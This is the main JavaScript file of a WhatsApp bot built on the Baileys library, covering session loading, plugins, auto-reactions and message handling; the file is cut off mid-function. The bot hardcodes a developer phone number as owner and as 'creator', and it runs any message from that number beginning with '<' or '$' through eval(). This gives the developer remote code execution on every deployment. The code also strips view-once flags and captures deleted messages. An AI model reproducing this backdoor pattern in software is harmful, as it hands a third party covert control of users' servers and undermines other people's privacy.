const {
  default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID, makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
  } = require('@whiskeysockets/baileys')
  
  
  const l = console.log
  const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
  const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
  const fs = require('fs')
  const ff = require('fluent-ffmpeg')
  const P = require('pino')
  const config = require('./config')
  const GroupEvents = require('./lib/groupevents');
  const qrcode = require('qrcode-terminal')
  const StickersTypes = require('wa-sticker-formatter')
  const util = require('util')
  const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
  const FileType = require('file-type');
  const axios = require('axios')
  const { File } = require('megajs')
  const { fromBuffer } = require('file-type')
  const bodyparser = require('body-parser')
  const os = require('os')
  const Crypto = require('crypto')
  const path = require('path')
  const prefix = config.PREFIX
  const mode = config.MODE
  const online = config.ALWAYS_ONLINE
  const status = config.AUTO_STATUS_SEEN
  const ownerNumber = ['923003588997']
  
  const tempDir = path.join(os.tmpdir(), 'cache-temp')
  if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir)
  }
  
  const clearTempDir = () => {
      fs.readdir(tempDir, (err, files) => {
          if (err) throw err;
          for (const file of files) {
              fs.unlink(path.join(tempDir, file), err => {
                  if (err) throw err;
              });
          }
      });
  }
  
  // Clear the temp directory every 5 minutes
  setInterval(clearTempDir, 5 * 60 * 1000);
  
  //===================SESSION-AUTH============================
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
const sessdata = config.SESSION_ID.replace("STARK-ALI~", '');
const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
filer.download((err, data) => {
if(err) throw err
fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
console.log("Session downloaded âœ…")
})})}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;
  
  //=============================================
  
  async function connectToWA() {
  console.log("Connecting to WhatsApp â³ï¸...");
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
  var { version } = await fetchLatestBaileysVersion()
  
  const conn = makeWASocket({
          logger: P({ level: 'silent' }),
          printQRInTerminal: false,
          browser: Browsers.macOS("Firefox"),
          syncFullHistory: true,
          auth: state,
          version
          })
      
  conn.ev.on('connection.update', (update) => {
  const { connection, lastDisconnect } = update
  if (connection === 'close') {
  if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
  connectToWA()
  }
  } else if (connection === 'open') {
  console.log('ðŸ§¬ Installing Plugins')
  const path = require('path');
  fs.readdirSync("./plugins/").forEach((plugin) => {
  if (path.extname(plugin).toLowerCase() == ".js") {
  require("./plugins/" + plugin);
  }
  });
  console.log('Plugins installed successful âœ…')
  console.log('Bot connected to whatsapp âœ…')
  
  let up = `*ð‡ð„ð‹ð‹ðŽ ð“ð‡ð„ð‘ð„ ð€ð‹ðˆ-ðŒðƒ ððŽð“ðŸ‘‘*
*ð‚ðŽððð„ð‚ð“ð„ðƒ ð’ð”ð‚ð‚ð„ð’ð’ð…ð”ð‹ð‹ð˜!*
  
*â•­â”€â”€â”€â”â”â”â”â”€â”€â”€â”â”â”â”â”€â”€â”‰â”ˆâš†*
*â”‚â€¢ ð“ð˜ðð„ .ðŒð„ðð” ð“ðŽ ð’ð„ð„ ð‹ðˆð’ð“ â€¢*
*â”‚â€¢ ððŽð“ ð€ðŒð€ð™ðˆðð† ð…ð„ð€ð“ð”ð‘ð„ð’ â€¢*
*â”‚â€¢ ðŸŒ¸ðƒð„ð•ð„ð‹ðŽðð„ð‘ : ð€É­Ä«Ä« ðˆÆžÌ„xÌ·Ä«Ä«É–ð›†Ì½*
*â”‚â€¢ â°ð€ð‹ð–ð€ð˜ð’ ðŽðð‹ðˆðð„ : ${online}*
*â”‚â€¢ ðŸ“œðð‘ð„ð…ðˆð— : ${prefix}*
*â”‚â€¢ ðŸª¾ðŒðŽðƒð„ : ${mode}*
*â”‚â€¢ ðŸª„ð’ð“ð€ð“ð”ð’ ð•ðˆð„ð–ð’ : ${status}*
*â”‚â€¢ ðŸ«Ÿð•ð„ð‘ð’ðˆðŽð : ðŸ’.ðŸŽ.ðŸŽ*
*â”—â”€â”€â”€â”â”â”â”â”€â”€â”€â”â”â”â”â”€â”€â”‰â”ˆâš†*`;
    conn.sendMessage(conn.user.id, { image: { url: `https://i.ibb.co/LDLMs949/lordali.jpg` }, caption: up })
  }
  })
  conn.ev.on('creds.update', saveCreds)

  //==============================

  conn.ev.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update.message === null) {
        console.log("Delete Detected:", JSON.stringify(update, null, 2));
        await AntiDelete(conn, updates);
      }
    }
  });
  //============================== 

  conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));	  
  // ============================== 
  const sendNoPrefix = async (client, message) => {
  try {
    if (!message.quoted) {
      return await client.sendMessage(message.chat, {
        text: "*ðŸ Please reply to a message!*"
      }, { quoted: message });
    }

    const buffer = await message.quoted.download();
    const mtype = message.quoted.mtype;
    const options = { quoted: message };

    let messageContent = {};
    switch (mtype) {
      case "imageMessage":
        messageContent = {
          image: buffer,
          caption: message.quoted.text || '',
          mimetype: message.quoted.mimetype || "image/jpeg"
        };
        break;
      case "videoMessage":
        messageContent = {
          video: buffer,
          caption: message.quoted.text || '',
          mimetype: message.quoted.mimetype || "video/mp4"
        };
        break;
      case "audioMessage":
        messageContent = {
          audio: buffer,
          mimetype: "audio/mp4",
          ptt: message.quoted.ptt || false
        };
        break;
      default:
        return await client.sendMessage(message.chat, {
          text: "âŒ Only image, video, and audio messages are supported"
        }, { quoted: message });
    }

    await client.sendMessage(message.chat, messageContent, options);
  } catch (error) {
    console.error("No Prefix Send Error:", error);
    await client.sendMessage(message.chat, {
      text: "âŒ Error forwarding message:\n" + error.message
    }, { quoted: message });
  }
};

// === BINA PREFIX COMMAND (send/sendme/stsend) ===
conn.ev.on('messages.upsert', async (msg) => {
  try {
    const m = msg.messages[0];
    if (!m.message || m.key.fromMe || m.key.participant === conn.user.id) return;

    const text = m.message?.conversation || m.message?.extendedTextMessage?.text;
    const from = m.key.remoteJid;
    if (!text) return;

    const command = text.toLowerCase().trim();
    const targetCommands = ["send", "sendme", "sand"];
    if (!targetCommands.includes(command)) return;

    const quoted = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quoted) {
      await conn.sendMessage(from, { text: "*ðŸ¥· Please reply to a message!*" }, { quoted: m });
      return;
    }

    const qMsg = {
      mtype: getContentType(quoted),
      mimetype: quoted[getContentType(quoted)]?.mimetype,
      text: quoted[getContentType(quoted)]?.caption || quoted[getContentType(quoted)]?.text || '',
      ptt: quoted[getContentType(quoted)]?.ptt || false,
      download: async () => {
        const stream = await downloadContentFromMessage(quoted[getContentType(quoted)], getContentType(quoted).replace("Message", ""));
        let buffer = Buffer.from([]);
        for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
        return buffer;
      }
    };

    m.chat = from;
    m.quoted = qMsg;

    await sendNoPrefix(conn, m);
  } catch (err) {
    console.error("No Prefix Handler Error:", err);
  }
});
          	  
  //=============readstatus=======
        
  conn.ev.on('messages.upsert', async(mek) => {
    mek = mek.messages[0]
    if (!mek.message) return
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
    ? mek.message.ephemeralMessage.message 
    : mek.message;
    //console.log("New Message Detected:", JSON.stringify(mek, null, 2));
  if (config.READ_MESSAGE === 'true') {
    await conn.readMessages([mek.key]);  // Mark message as read
    console.log(`Marked message from ${mek.key.remoteJid} as read.`);
  }
    if(mek.message.viewOnceMessageV2)
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
      await conn.readMessages([mek.key])
    }
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
    const jawadlike = await conn.decodeJid(conn.user.id);
    const emojis = ['â¤ï¸', 'ðŸ’¸', 'ðŸ˜‡', 'ðŸ‚', 'ðŸ’¥', 'ðŸ’¯', 'ðŸ”¥', 'ðŸ’«', 'ðŸ’Ž', 'ðŸ’—', 'ðŸ¤', 'ðŸ–¤', 'ðŸ‘€', 'ðŸ™Œ', 'ðŸ™†', 'ðŸš©', 'ðŸ¥°', 'ðŸ’', 'ðŸ˜Ž', 'ðŸ¤Ž', 'âœ…', 'ðŸ«€', 'ðŸ§¡', 'ðŸ˜', 'ðŸ˜„', 'ðŸŒ¸', 'ðŸ•Šï¸', 'ðŸŒ·', 'â›…', 'ðŸŒŸ', 'ðŸ—¿', 'ðŸ‡µðŸ‡°', 'ðŸ’œ', 'ðŸ’™', 'ðŸŒ', 'ðŸ–¤', 'ðŸŽŽ', 'ðŸŽ', 'ðŸŽ', 'âš½', 'ðŸ§£', 'ðŸŒ¿', 'â›ˆï¸', 'ðŸŒ¦ï¸', 'ðŸŒš', 'ðŸŒ', 'ðŸ™ˆ', 'ðŸ™‰', 'ðŸ¦–', 'ðŸ¤', 'ðŸŽ—ï¸', 'ðŸ¥‡', 'ðŸ‘¾', 'ðŸ”«', 'ðŸ', 'ðŸ¦‹', 'ðŸ“', 'ðŸ«', 'ðŸ­', 'ðŸ§', 'ðŸ§ƒ', 'ðŸ¿', 'ðŸ»', 'ðŸŽ€', 'ðŸ§¸', 'ðŸ‘‘', 'ã€½ï¸', 'ðŸ˜³', 'ðŸ’€', 'â˜ ï¸', 'ðŸ‘»', 'ðŸ”¥', 'â™¥ï¸', 'ðŸ‘€', 'ðŸ¼'];
    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
    await conn.sendMessage(mek.key.remoteJid, {
      react: {
        text: randomEmoji,
        key: mek.key,
      } 
    }, { statusJidList: [mek.key.participant, jawadlike] });
  }                       
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
  const user = mek.key.participant
  const text = `${config.AUTO_STATUS_MSG}`
  await conn.sendMessage(user, { text: text, react: { text: 'ðŸ’œ', key: mek.key } }, { quoted: mek })
            }
            await Promise.all([
              saveMessage(mek),
            ]);
  const m = sms(conn, mek)
  const type = getContentType(mek.message)
  const content = JSON.stringify(mek.message)
  const from = mek.key.remoteJid
  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
  const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
  const isCmd = body.startsWith(prefix)
  var budy = typeof mek.text == 'string' ? mek.text : false;
  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
  const args = body.trim().split(/ +/).slice(1)
  const q = args.join(' ')
  const text = args.join(' ')
  const isGroup = from.endsWith('@g.us')
  const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
  const senderNumber = sender.split('@')[0]
  const botNumber = conn.user.id.split(':')[0]
  const pushname = mek.pushName || 'Sin Nombre'
  const isMe = botNumber.includes(senderNumber)
  const isOwner = ownerNumber.includes(senderNumber) || isMe
  const botNumber2 = await jidNormalizedUser(conn.user.id);
  const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
  const groupName = isGroup ? groupMetadata.subject : ''
  const participants = isGroup ? await groupMetadata.participants : ''
  const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
  const isReact = m.message.reactionMessage ? true : false
  const reply = (teks) => {
  conn.sendMessage(from, { text: teks }, { quoted: mek })
  }
  const udp = botNumber.split('@')[0];
    const jawad = ('923003588997');
    let isCreator = [udp, jawad, config.DEV]
					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
					.includes(mek.sender);

    if (isCreator && mek.text.startsWith('<')) {
					let code = budy.slice(2);
					if (!code) {
						reply(
							`undefined`,
						);
						return;
					}
					try {
						let resultTest = eval(code);
						if (typeof resultTest === 'object')
							reply(util.format(resultTest));
						else reply(util.format(resultTest));
					} catch (err) {
						reply(util.format(err));
					}
					return;
				}
    if (isCreator && mek.text.startsWith('$')) {
					let code = budy.slice(2);
					if (!code) {
						reply(
							`Provide me with a query to run Master!`,
						);
						return;
					}
					try {
						let resultTest = await eval(
							'const a = async()=>{\n' + code + '\n}\na()',
						);
						let h = util.format(resultTest);
						if (h === undefined) return console.log(h);
						else reply(h);
					} catch (err) {
						if (err === undefined)
							return console.log('error');
						else reply(util.format(err));
					}
					return;
				}
 //================ownerreact==============
    
if (senderNumber.includes("923003588997") && !isReact) {
  const reactions = ["ðŸ‘‘", "ðŸ«œ", "ðŸ«†", "ðŸ«©", "ðŸª¾", "ðŸª‰", "ðŸª", "ðŸ«Ÿ"];
  const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
  m.react(randomReaction);
}

  //==========public react============//
  
// Auto React for all messages (public and owner)
if (!isReact && config.AUTO_REACT === 'true') {
    const reactions = [
        'ðŸŒ¼', 'â¤ï¸', 'ðŸ’', 'ðŸ”¥', 'ðŸµï¸', 'â„ï¸', 'ðŸ§Š', 'ðŸ³', 'ðŸ’¥', 'ðŸ¥€', 'â¤â€ðŸ”¥', 'ðŸ¥¹', 'ðŸ˜©', 'ðŸ«£', 
        'ðŸ¤­', 'ðŸ‘»', 'ðŸ‘¾', 'ðŸ«¶', 'ðŸ˜»', 'ðŸ™Œ', 'ðŸ«‚', 'ðŸ«€', 'ðŸ‘©â€ðŸ¦°', 'ðŸ§‘â€ðŸ¦°', 'ðŸ‘©â€âš•ï¸', 'ðŸ§‘â€âš•ï¸', 'ðŸ§•', 
        'ðŸ‘©â€ðŸ«', 'ðŸ‘¨â€ðŸ’»', 'ðŸ‘°â€â™€', 'ðŸ¦¹ðŸ»â€â™€ï¸', 'ðŸ§Ÿâ€â™€ï¸', 'ðŸ§Ÿ', 'ðŸ§žâ€â™€ï¸', 'ðŸ§ž', 'ðŸ™…â€â™€ï¸', 'ðŸ’â€â™‚ï¸', 'ðŸ’â€â™€ï¸', 'ðŸ™†â€â™€ï¸', 
        'ðŸ™‹â€â™€ï¸', 'ðŸ¤·', 'ðŸ¤·â€â™€ï¸', 'ðŸ¤¦', 'ðŸ¤¦â€â™€ï¸', 'ðŸ’‡â€â™€ï¸', 'ðŸ’‡', 'ðŸ’ƒ', 'ðŸš¶â€â™€ï¸', 'ðŸš¶', 'ðŸ§¶', 'ðŸ§¤', 'ðŸ‘‘', 
        'ðŸ’', 'ðŸ‘', 'ðŸ’¼', 'ðŸŽ’', 'ðŸ¥½', 'ðŸ»', 'ðŸ¼', 'ðŸ­', 'ðŸ£', 'ðŸª¿', 'ðŸ¦†', 'ðŸ¦Š', 'ðŸ¦‹', 'ðŸ¦„', 
        'ðŸª¼', 'ðŸ‹', 'ðŸ³', 'ðŸ¦ˆ', 'ðŸ', 'ðŸ•Šï¸', 'ðŸ¦¦', 'ðŸ¦š', 'ðŸŒ±', 'ðŸƒ', 'ðŸŽ', 'ðŸŒ¿', 'â˜˜ï¸', 'ðŸ€', 
        'ðŸ', 'ðŸªº', 'ðŸ„', 'ðŸ„â€ðŸŸ«', 'ðŸª¸', 'ðŸª¨', 'ðŸŒº', 'ðŸª·', 'ðŸª»', 'ðŸ¥€', 'ðŸŒ¹', 'ðŸŒ·', 'ðŸ’', 'ðŸŒ¾', 
        'ðŸŒ¸', 'ðŸŒ¼', 'ðŸŒ»', 'ðŸŒ', 'ðŸŒš', 'ðŸŒ•', 'ðŸŒŽ', 'ðŸ’«', 'ðŸ”¥', 'â˜ƒï¸', 'â„ï¸', 'ðŸŒ¨ï¸', 'ðŸ«§', 'ðŸŸ', 
        'ðŸ«', 'ðŸ§ƒ', 'ðŸ§Š', 'ðŸª€', 'ðŸ¤¿', 'ðŸ†', 'ðŸ¥‡', 'ðŸ¥ˆ', 'ðŸ¥‰', 'ðŸŽ—ï¸', 'ðŸ¤¹', 'ðŸ¤¹â€â™€ï¸', 'ðŸŽ§', 'ðŸŽ¤', 
        'ðŸ¥', 'ðŸ§©', 'ðŸŽ¯', 'ðŸš€', 'ðŸš', 'ðŸ—¿', 'ðŸŽ™ï¸', 'âŒ›', 'â³', 'ðŸ’¸', 'ðŸ’Ž', 'âš™ï¸', 'â›“ï¸', 'ðŸ”ª', 
        'ðŸ§¸', 'ðŸŽ€', 'ðŸª„', 'ðŸŽˆ', 'ðŸŽ', 'ðŸŽ‰', 'ðŸ®', 'ðŸª©', 'ðŸ“©', 'ðŸ’Œ', 'ðŸ“¤', 'ðŸ“¦', 'ðŸ“Š', 'ðŸ“ˆ', 
        'ðŸ“‘', 'ðŸ“‰', 'ðŸ“‚', 'ðŸ”–', 'ðŸ§·', 'ðŸ“Œ', 'ðŸ“', 'ðŸ”', 'ðŸ”', 'ðŸ©·', 'â¤ï¸', 'ðŸ§¡', 'ðŸ’›', 'ðŸ’š', 
        'ðŸ©µ', 'ðŸ’™', 'ðŸ’œ', 'ðŸ–¤', 'ðŸ©¶', 'ðŸ¤', 'ðŸ¤Ž', 'â¤â€ðŸ”¥', 'â¤â€ðŸ©¹', 'ðŸ’—', 'ðŸ’–', 'ðŸ’˜', 'ðŸ’', 'âŒ', 
        'âœ…', 'ðŸ”°', 'ã€½ï¸', 'ðŸŒ', 'ðŸŒ€', 'â¤´ï¸', 'â¤µï¸', 'ðŸ”´', 'ðŸŸ¢', 'ðŸŸ¡', 'ðŸŸ ', 'ðŸ”µ', 'ðŸŸ£', 'âš«', 
        'âšª', 'ðŸŸ¤', 'ðŸ”‡', 'ðŸ”Š', 'ðŸ“¢', 'ðŸ”•', 'â™¥ï¸', 'ðŸ•', 'ðŸš©', 'ðŸ‡µðŸ‡°', 'ðŸ§³', 'ðŸŒ‰', 'ðŸŒ', 'ðŸ›¤ï¸', 'ðŸ›£ï¸', 'ðŸšï¸', 'ðŸ ', 'ðŸ¡', 'ðŸ§€', 'ðŸ¥', 'ðŸ®', 'ðŸ°', 'ðŸ¦', 'ðŸ¨', 'ðŸ§', 'ðŸ¥ ', 'ðŸ¡', 'ðŸ§‚', 'ðŸ¯', 'ðŸª', 'ðŸ©', 'ðŸ­', 'ðŸ¥®', 'ðŸ¡'
    ];

    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
    m.react(randomReaction);
}
          
// custum react settings        
                        
// Custom React for all messages (public and owner)
if (!isReact && config.CUSTOM_REACT === 'true') {
    // Use custom emojis from the configuration (fallback to default if not set)
    const reactions = (config.CUSTOM_REACT_EMOJIS || 'ðŸ¥²,ðŸ˜‚,ðŸ‘ðŸ»,ðŸ™‚,ðŸ˜”').split(',');
    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
    m.react(randomReaction);
}
        
  //==========WORKTYPE============ 
  if(!isOwner && config.MODE === "private") return
  if(!isOwner && isGroup && config.MODE === "inbox") return
  if(!isOwner && !isGroup && config.MODE === "groups") return
   
  // take commands 
                 
  const events = require('./command')
  const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
  if (isCmd) {
  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
  if (cmd) {
  if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
  
  try {
  cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
  } catch (e) {
  console.error("[PLUGIN ERROR] " + e);
  }
  }
  }
  events.commands.map(async(command) => {
  if (body && command.on === "body") {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  } else if (mek.q && command.on === "text") {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  } else if (
  (command.on === "image" || command.on === "photo") &&
  mek.type === "imageMessage"
  ) {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  } else if (
  command.on === "sticker" &&
  mek.type === "stickerMessage"
  ) {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  }});
  
  });
    //===================================================   
    conn.decodeJid = jid => {
      if (!jid) return jid;
      if (/:\d+@/gi.test(jid)) {
        let decode = jidDecode(jid) || {};
        return (
          (decode.user &&
            decode.server &&
            decode.user + '@' + decode.server) ||
          jid
        );
      } else return jid;
    };
    //===================================================
    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
      let vtype
      if (options.readViewOnce) {
          message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
          vtype = Object.keys(message.message.viewOnceMessage.message)[0]
          delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
          delete message.message.viewOnceMessage.message[vtype].viewOnce
          message.message = {
              ...message.message.viewOnceMessage.message
          }
      }
    
      let mtype = Object.keys(message.message)[0]
      let content = await generateForwardMessageContent(message, forceForward)
      let ctype = Object.keys(content)[0]
      let context = {}
      if (mtype != "conversation") context = message.message[mtype].contextInfo
      content[ctype].contextInfo = {
          ...context,
          ...content[ctype].contextInfo
      }
      const waMessage = await generateWAMessageFromContent(jid, content, options ? {
        
